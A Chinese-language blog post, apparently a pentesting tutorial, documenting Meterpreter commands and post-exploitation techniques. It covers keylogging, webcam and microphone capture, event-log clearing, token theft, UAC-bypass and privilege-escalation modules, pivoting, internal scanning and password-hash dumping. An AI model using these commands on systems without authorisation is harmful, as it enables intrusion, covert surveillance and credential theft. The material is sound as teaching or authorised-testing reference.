---
layout: post
title:'meterpreter使用详解'
date: 2019-1-7
author: Jacob
cover: 'http://on2171g4d.bkt.clouddn.com/jekyll-banner.png'
tags: tools


---


# meterpreter使用详解

* TOC
{:toc}
## 0 meterpreter简介

Meterpreter是一种先进的，可动态扩展的有效负载，它使用内存中的 DLL注入阶段，并在运行时通过网络扩展。它通过stager套接字进行通信并提供全面的客户端Ruby API。它包含命令历史记录，制表符完成，频道等。

Metepreter最初由Metasploit 2.x的skape编写，常见的扩展名合并为3.x，目前正在对Metasploit 3.3进行大修。服务器部分以纯C实现，现在使用MSVC进行编译，使其具有一定的便携性。客户端可以用任何语言编写，但Metasploit具有全功能的Ruby客户端API。

**Meterpreter如何工作？**

- 目标执行初始stager。这通常是bind，reverse，findtag，passivex等之一。
- stager加载以Reflective为前缀的DLL。反射存根处理DLL的加载/注入。
- Metepreter内核初始化，通过套接字建立TLS / 1.0链接并发送GET。Metasploit接收这个GET并配置客户端。
- 最后，Meterpreter加载扩展。它将始终加载stdapi，并在模块提供管理权限时加载priv。所有这些扩展都使用TLV协议通过TLS / 1.0加载。

**Meterpreter设计目标**

**隐身**

- Meterpreter完全驻留在内存中，并且不向磁盘写任何内容。
- 由于Meterpreter将自身注入受损的进程并且可以轻松迁移到其他正在运行的进程，因此不会创建新进程。
- 默认情况下，Meterpreter使用加密通信。
- 所有这些提供有限的法医证据和对受害者机器的影响。

**强大**

- Meterpreter采用通道化通信系统。
- TLV协议有一些限制。

**扩展**

- 功能可以在运行时扩充并通过网络加载。
- 可以将新功能添加到Meterpreter，而无需重新构建它。

**添加运行时功能**

通过加载扩展将新功能添加到Meterpreter。

- 客户端通过套接字上载DLL。
- 在受害者上运行的服务器加载内存中的DLL并对其进行初始化。
- 新的扩展将自己注册到服务器。
- 攻击者机器上的客户端加载本地扩展API，现在可以调用扩展功能。

整个过程是无缝的，大约需要1秒钟才能完成。

## 1 meterpreter控制技巧总结

### 1.1 命令详解

以下为meterpreter帮助信息

> ```shell
> 
> Core Commands
> =============
> 
>     Command                   Description
>     -------                   -----------
>     ?                         帮助文档
>     background                将当前meterpreter隐藏到后台
>     bg                        同上
>     bgkill                    关闭后台运行的meterpreter脚本
>     bglist                    列出正在运行的meterpreter脚本
>     bgrun                     在后台运行一个meterpreter
>     channel                   通信频道
>     close                     关闭一个通信通道
>     disable_unicode_encoding  Disables encoding of unicode strings
>     enable_unicode_encoding   Enables encoding of unicode strings
>     exit                      关闭当前meterpreter会话
>     get_timeouts              查询当前会话延迟时间
>     guid                      获取当前会话的GUID
>     help                      帮助文档
>     info                      显示某个POST模块（后渗透模块）的帮助信息
>     irb                       在当前会话打开交互式ruby shell
>     load                      加载meterpreter扩展，常用mimikatz，kiwi
>     machine_id                Get the MSF ID of the machine attached to the session
>     migrate                   迁移会话到另一个进程
>     pivot                     建立pivot代理，用于打穿内网
>     pry                       Open the Pry debugger on the current session
>     quit                      同exit
>     read                      从某一个通信通道中读取数据
>     resource                  执行在某个文件中存储的命令
>     run                       执行一个meterpreter脚本或者post（后渗透）模块
>     sessions                  快速切换会话
>     set_timeouts              设置当前会话的延迟时间
>     sleep                     强迫meterpreter静默，然后重新建立连接
>     transport                 Change the current transport mechanism
>     use                       load的别名
>     uuid                      获取当前会话的uuid
>     write                     向通信通道中写入数据
> 
> 
> Stdapi: File system Commands
> ============================
> 
>     Command       Description
>     -------       -----------
>     cat           读取文件内容
>     cd            更改工作目录
>     checksum      检索文件校验和
>     cp            复制
>     dir           显示文件目录，同ls
>     download      下载文件或目录
>     edit          编辑文件
>     getlwd        获取本地工作目录
>     getwd         获取工作目录
>     lcd           改变本地工作目录
>     lls           显示本地文件目录
>     lpwd          显示本地工作目录
>     ls            显示文件目录
>     mkdir         新建文件夹
>     mv            剪切
>     pwd           打印当前文件目录
>     rm            删除文件
>     rmdir         删除文件夹
>     search        查找文件
>     show_mount    列出所有挂载的硬盘
>     upload        上传
> 
> 
> Stdapi: Networking Commands
> ===========================
> 
>     Command       Description
>     -------       -----------
>     arp           显示主机arp缓存
>     getproxy      显示当前代理设置
>     ifconfig      显示网卡信息
>     ipconfig      显示网卡信息
>     netstat       显示网络连接
>     portfwd       端口转发
>     resolve       解析目标主机上的一组主机名，查找ip地址和主机地址对应关系
>     route         显示、更改路由表
> 
> 
> Stdapi: System Commands
> =======================
> 
>     Command       Description
>     -------       -----------
>     clearev       清空时间日志
>     drop_token    Relinquishes any active impersonation token.
>     execute       执行命令
>     getenv        获取环境变量
>     getpid        获取当前进程id
>     getprivs      尝试获取更多权限
>     getsid        获取当前进程的用户id
>     getuid        获取uid
>     kill          杀进程
>     localtime     显示主机当地时间
>     pgrep         通过进程名称过滤进程
>     pkill         通过名称杀进程
>     ps            列出正在运行的进程
>     reboot        重启远程主机
>     reg           修改远程主机注册表
>     rev2self      Calls RevertToSelf() on the remote machine
>     shell         打开远程主机shell
>     shutdown      关闭远程主机
>     steal_token   Attempts to steal an impersonation token from the target proce
> ss
>     suspend       挂起或唤醒进程
>     sysinfo       获取主机系统信息
> 
> 
> Stdapi: User interface Commands
> ===============================
> 
>     Command        Description
>     -------        -----------
>     enumdesktops   列出所有桌面
>     getdesktop     Get the current meterpreter desktop
>     idletime       Returns the number of seconds the remote user has been idle
>     keyscan_dump   键盘监听
>     keyscan_start  键盘监听
>     keyscan_stop   键盘监听
>     screenshot     截屏
>     setdesktop     改变桌面
>     uictl          Control some of the user interface components
> 
> 
> Stdapi: Webcam Commands
> =======================
> 
>     Command        Description
>     -------        -----------
>     record_mic     Record audio from the default microphone for X seconds
>     webcam_chat    Start a video chat
>     webcam_list    List webcams
>     webcam_snap    Take a snapshot from the specified webcam
>     webcam_stream  Play a video stream from the specified webcam
> 
> 
> Stdapi: Audio Output Commands
> =============================
> 
>     Command       Description
>     -------       -----------
>     play          play an audio file on target system, nothing written on disk
> 
> 
> Priv: Elevate Commands
> ======================
> 
>     Command       Description
>     -------       -----------
>     getsystem     尝试提高权限
> 
> 
> Priv: Password database Commands
> ================================
> 
>     Command       Description
>     -------       -----------
>     hashdump      dump ash
> 
> 
> Priv: Timestomp Commands
> ========================
> 
>     Command       Description
>     -------       -----------
>     timestomp     操控文件时间戳
> ```
>
>

### 1.2 sessions 控制命令



> ```shell
> msf exploit(windows/local/ms16_016_webdav) > sessions -h
> Usage: sessions [options] or sessions [id]
> 
> Active session manipulation and interaction.
> 
> OPTIONS:
> 
>     -C <opt>  Run a Meterpreter Command on the session given with -i, or all
>     -K        Terminate all sessions
>     -S <opt>  Row search filter.
>     -c <opt>  Run a command on the session given with -i, or all
>     -d        List all inactive sessions
>     -h        Help banner
>     -i <opt>  Interact with the supplied session ID
>     -k <opt>  Terminate sessions by session ID and/or range
>     -l        List all active sessions
>     -n <opt>  Name or rename a session by ID
>     -q        Quiet mode
>     -s <opt>  Run a script or module on the session given with -i, or all
>     -t <opt>  Set a response timeout (default: 15)
>     -u <opt>  Upgrade a shell to a meterpreter session on many platforms
>     -v        List all active sessions in verbose mode
>     -x        Show extended information in the session table
> 
> Many options allow specifying session ranges using commas and dashes.
> For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6
> ```
>
>

### 1.3 meterpreter收集信息

#### 1.3.1 meterpreter 收集windows主机信息

##### 1.3.1.1 收集系统信息

方法一：

```shell
shell
systeminfo
```

方法二：

```shell
sysinfo
```

##### 1.3.1.2 收集本地（域）用户信息

```shell
shell
net user
net user /domain
```

##### 1.3.1.3 收集当前用户信息

```shell
shell
whoami /all
```

##### 1.3.1.4 收集主机所运行的服务

```shell
 run service_manager -l
```

##### 1.3.1.5 查询主机所在地理位置

```shell
run post/multi/gather/wlan_geolocate
```

##### 1.3.1.6 查询arp信息

```shell
arp
```

##### 1.3.1.7 枚举用户

```shell
run post/windows/gather/enum_computers
```

##### 1.3.1.8 读取目标主机的WIFI密码

```shell
run post/windows/wlan/wlan_profile
```

##### 1.3.1.9 监视

```shell
run vnc
run sound_recorder
run webcam
```

#### 1.3.2 meterpreter 收集linux主机信息

### 1.4 meterpreter 提升权限常用模块

#### 1.4.1 Windows提权

##### 1.4.1.1 绕过UAC进行提权

使用以下模块

```shell
exploit/windows/local/bypassuac
exploit/windows/local/bypassuac_injection
exploit/windows/local/bypassuac_vbs
```

##### 1.4.1.2 提高程序运行级别（runas）

使用以下模块

```shell
exploit/windows/local/ask
```

该模块实际是使用更高权限运行程序，没有绕过UAC靶机会有响应，一般不使用。

##### 1.4.1.3 利用windows提权漏洞进行提权

使用ms13_053,ms14_058,ms16_016,ms16_032等提权漏洞

对应漏洞补丁编号为

| 漏洞编号 | CVE编号       | 补丁编号  |
| -------- | ------------- | --------- |
| ms13_053 | CVE-2013-3129 | KB2850851 |
| ms14_058 | CVE-2014-4148 | KB3000061 |
| ms16_016 | CVE-2016-0051 | KB3019215 |
| ms16_032 | CVE-2016-0099 | KB3135174 |

漏洞利用对应模块（PS.msf版本为metasploit v4.17.24-dev）

| 漏洞编号 | msf对应模块                                                  |
| -------- | ------------------------------------------------------------ |
| ms13_053 | exploit/windows/local/ms13_053_schlamperei                   |
| ms14_058 | exploit/windows/local/ms14_058_track_popup_menu              |
| ms16_016 | exploit/windows/local/ms16_016_webdav                        |
| ms16_032 | exploit/windows/local/ms16_032_secondary_logon_handle_privesc |

以上是常用的提权模块，如果以上尝试均失败，请查看漏洞影响的系统版本，以及对应主机中是否安装了月度更新。

##### 1.4.1.4 使用meterpreter命令提权

```sh
getsystem
```

#### 1.4.2 Linux提权



### 1.5 meterpreter控制逻辑总结
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190107162926195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxMzEwNjg5,size_16,color_FFFFFF,t_70)


## 2 POST 内网渗透总结

### 2.1 内网穿透

#### 2.1.1 查询主机路由

> ```shell
> run get_local_subnets
> result:
> [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
> [!] Example: run post/multi/manage/autoroute OPTION=value [...]
> Local subnet: 1.22.124.0/255.255.255.0
> Local subnet: 192.168.1.0/255.255.255.0
> meterpreter > info post/multi/manage/autoroute
> 
>        Name: Multi Manage Network Route via Meterpreter Session
>      Module: post/multi/manage/autoroute
>    Platform:
>        Arch:
>        Rank: Normal
> 
> Provided by:
>   todb <todb@metasploit.com>
>   Josh Hale "sn0wfa11" <jhale85446@gmail.com>
> 
> Compatible session types:
>   Meterpreter
> 
> Basic options:
>   Name     Current Setting  Required  Description
>   ----     ---------------  --------  -----------
>   CMD      autoadd          yes       Specify the autoroute command (Accepted: a
> dd, autoadd, print, delete, default)
>   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR a
> s "/24"
>   SESSION                   yes       The session to run this module on.
>   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)
> 
> Description:
>   This module manages session routing via an existing Meterpreter
>   session. It enables other modules to 'pivot' through a compromised
>   host when connecting to the named NETWORK and SUBMASK. Autoadd will
>   search a session for valid subnets from the routing table and
>   interface list then add routes to them. Default will add a default
>   route so that all TCP/IP traffic not specified in the MSF routing
>   table will be routed through the session when pivoting. See
>   documentation for more 'info -d' and click 'Knowledge Base'
> 
> 
> 
> Module options (post/multi/manage/autoroute):
> 
>    Name     Current Setting  Required  Description
>    ----     ---------------  --------  -----------
>    CMD      autoadd          yes       Specify the autoroute command (Accepted:
> add, autoadd, print, delete, default)
>    NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR
> as "/24"
>    SESSION                   yes       The session to run this module on.
>    SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)
> ```
>
>

#### 2.1.2 内网主机发现

扫描内网存活主机

```shell

run arp_scanner -r x.x.x.x/24
```

#### 2.1.3 内网主机端口扫描

使用db_nmap



### 2.2 后渗透攻击技巧

#### 2.2.3 查询域用户

```shell
run domain_list_gen
```

#### 2.2.4 导出全域hash

```shell
hashdump
```



## 3 感谢

[Metasploit 中 Meterpreter 介绍](https://www.fujieace.com/metasploit/meterpreter.html)

[Metasploit入门系列(九)——Meterpreter(二)](https://www.jianshu.com/p/91588e284fe8)

